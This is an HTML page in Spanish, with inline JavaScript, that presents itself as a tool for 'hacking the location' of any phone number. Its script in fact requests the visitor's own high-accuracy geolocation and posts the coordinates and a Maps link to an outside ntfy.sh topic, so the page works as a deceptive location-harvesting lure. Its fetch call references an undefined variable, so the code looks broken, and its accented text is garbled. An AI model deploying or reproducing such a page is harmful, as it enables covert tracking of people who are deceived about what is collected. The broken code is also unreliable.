<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hackeo</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 500px;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }
        .header {
            background: #1a2a6c;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .content {
            padding: 25px;
        }
        .description {
            margin-bottom: 25px;
            line-height: 1.6;
            text-align: center;
        }
        .location-btn {
            display: block;
            width: 100%;
            padding: 15px;
            background: #b21f1f;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        .location-btn:hover {
            background: #8a1a1a;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(178, 31, 31, 0.4);
        }
        .location-btn:active {
            transform: translateY(0);
        }
        .location-btn:disabled {
            background: #b2b2b2;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .status {
            text-align: center;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .status.pending {
            background-color: #fff4e5;
            color: #ff8c00;
        }
        .status.success {
            background-color: #e6f7ee;
            color: #28a745;
        }
        .status.error {
            background-color: #ffe6e6;
            color: #dc3545;
        }
        .coordinates {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            font-family: monospace;
            white-space: pre-wrap;
            display: none;
        }
        .map-link {
            display: block;
            text-align: center;
            margin-top: 15px;
            color: #1a2a6c;
            text-decoration: none;
            font-weight: bold;
        }
        .map-link:hover {
            text-decoration: underline;
        }
        .accuracy {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #6c757d;
        }
        .notification {
            background-color: #f8f9fa;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            display: none;
        }
        .notification.success {
            display: block;
            border-left: 4px solid #28a745;
        }
        .ntfy-topic {
            font-weight: bold;
            color: #1a2a6c;
        }
        .footer {
            text-align: center;
            padding: 15px;
            font-size: 12px;
            color: #6c757d;
            border-top: 1px solid #e9ecef;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üìç hackeo de ubicaciones</h1>
        </div>
        <div class="content">
            <p class="description">esta p√°gina sirve para hackear ubicaci√≥n de un n√∫mero a gusto</p>
            
            <button id="requestLocation" class="location-btn">haackear ubicaci√≥n con herramientas </button>
            
            <div id="locationStatus" class="status pending">Esperando herramientas de hacking...</div>
            
            <div id="coordinates" class="coordinates"></div>
            
            <div id="notification" class="notification">
                <strong>Notificaci√≥n enviada con √©xito</strong>
                <p>hackear ubicaci√≥n de los dem√°s: <span class="ntfy-topic" id="topicName">ubicaciones</span></p>
            </div>
        </div>
        <div class="footer">
            &copy; 2023 - Servicio de Geolocalizaci√≥n con NTFY
        </div>
    </div>

    <script>
        // Configuraci√≥n de NTFY (cambia esto por tu tema real)
        const ntfyTopic = 'ubicaciones_alfa';
        const ntfyServer = 'https://ntfy.sh';
        
        // Elementos del DOM
        const locationStatus = document.getElementById('locationStatus');
        const requestLocationBtn = document.getElementById('requestLocation');
        const coordinatesDiv = document.getElementById('coordinates');
        const notificationDiv = document.getElementById('notification');
        const topicNameSpan = document.getElementById('topicName');
        
        // Estado de la ubicaci√≥n
        let locationGranted = false;
        let userCoordinates = null;
        
        // Actualizar estado
        function updateStatus(status, message) {
            locationStatus.textContent = message;
            locationStatus.className = 'status ' + status;
            
            if (status === 'success') {
                requestLocationBtn.disabled = true;
                requestLocationBtn.textContent = 'Ubicaci√≥n Enviada ‚úì';
            }
        }
        
        // Solicitar ubicaci√≥n
        requestLocationBtn.addEventListener('click', () => {
            if (navigator.geolocation) {
                updateStatus('pending', 'Solicitando herramientas de hacking...');
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        locationGranted = true;
                        userCoordinates = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        updateStatus('pending', 'Ubicaci√≥n obtenida. Enviando a NTFY...');
                        
                        // Mostrar coordenadas
                        coordinatesDiv.style.display = 'block';
                        coordinatesDiv.innerHTML = 
                            `Latitud: ${userCoordinates.lat.toFixed(6)}\n` +
                            `Longitud: ${userCoordinates.lng.toFixed(6)}\n` +
                            `<span class="accuracy">Precisi√≥n: ${userCoordinates.accuracy.toFixed(2)} metros</span>`;
                        
                        // Agregar enlace a Google Maps
                        const mapLink = document.createElement('a');
                        mapLink.href = `https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}`;
                        mapLink.target = '_blank';
                        mapLink.className = 'map-link';
                        mapLink.textContent = 'Ver en Google Maps';
                        coordinatesDiv.appendChild(mapLink);
                        
                        try {
                            // Enviar notificaci√≥n a NTFY
                            await sendLocationToNtfy(userCoordinates);
                            
                            updateStatus('success', 'Ubicaci√≥n enviada correctamente ‚úì');
                            
                            // Mostrar notificaci√≥n de √©xito
                            topicNameSpan.textContent = ntfyTopic;
                            notificationDiv.classList.add('success');
                            
                        } catch (error) {
                            console.error('Error enviando a NTFY:', error);
                            updateStatus('error', 'Error al hackear ubicaci√≥n .');
                        }
                    },
                    (error) => {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Permiso de ubicaci√≥n denegado por el usuario.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "La informaci√≥n de ubicaci√≥n no est√° disponible.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "La solicitud de ubicaci√≥n ha expirado.";
                                break;
                            default:
                                errorMessage = "Error desconocido al obtener la ubicaci√≥n.";
                        }
                        updateStatus('error', errorMessage);
                    },
                    { 
                        enableHighAccuracy: true, 
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                updateStatus('error', 'La geolocalizaci√≥n no es compatible con este navegador.');
            }
        });
        
        // Funci√≥n para enviar ubicaci√≥n a NTFY
        async function sendLocationToNtfy(coords) {
            const message = `üìç Nueva ubicaci√≥n obtenida:\n\n` +
                           `Latitud: ${coords.lat.toFixed(6)}\n` +
                           `Longitud: ${coords.lng.toFixed(6)}\n` +
                           `Precisi√≥n: ${coords.accuracy.toFixed(2)} metros\n\n` +
                           `Google Maps: https://www.google.com/maps?q=${coords.lat},${coords.lng}`;
            
            const response = await fetch(`${ntfyServer}/${pe9278301}`, {
                method: 'POST',
                body: message,
                headers: {
                    'Title': 'üìç Nueva ubicaci√≥n ',
                    'Priority': 'high',
                    'Tags': 'round_pushpin'
                }
            });
            
            if (!response.ok) {
                throw new Error(`Error HTTP: ${response.status}`);
            }
            
            return response;
        }
    </script>
</body>
</html>
